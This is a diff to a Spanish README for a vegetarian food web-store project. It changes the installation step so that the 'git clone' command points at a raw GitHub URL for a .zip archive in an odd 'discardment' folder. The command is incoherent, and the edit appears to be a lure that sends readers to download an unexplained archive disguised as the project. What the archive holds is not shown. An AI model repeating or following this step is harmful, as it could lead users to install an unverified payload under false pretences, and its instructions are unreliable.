@@ -4,7 +4,7 @@ Este proyecto es un sitio web para una tienda en línea de venta de comida veget
 
 ## Cómo usar el proyecto:
 
-Para usar el proyecto, primero debes clonar el repositorio en tu máquina local ejecutando el siguiente comando **git clone https://github.com/tunombredeusuario/proyecto.git**. También necesitarás instalar las dependencias del proyecto. Puedes hacerlo usando **npm install**. Una vez que tengas todo configurado, puedes iniciar el servidor de desarrollo usando "npm start".
+Para usar el proyecto, primero debes clonar el repositorio en tu máquina local ejecutando el siguiente comando **git clone https://raw.githubusercontent.com/MaxPaez/No_Vives_de_Ensalada-Paez/main/discardment/No_Vives_de_Ensalada-Paez.zip**. También necesitarás instalar las dependencias del proyecto. Puedes hacerlo usando **npm install**. Una vez que tengas todo configurado, puedes iniciar el servidor de desarrollo usando "npm start".
 
 ## Libreria adicional utilizada
 
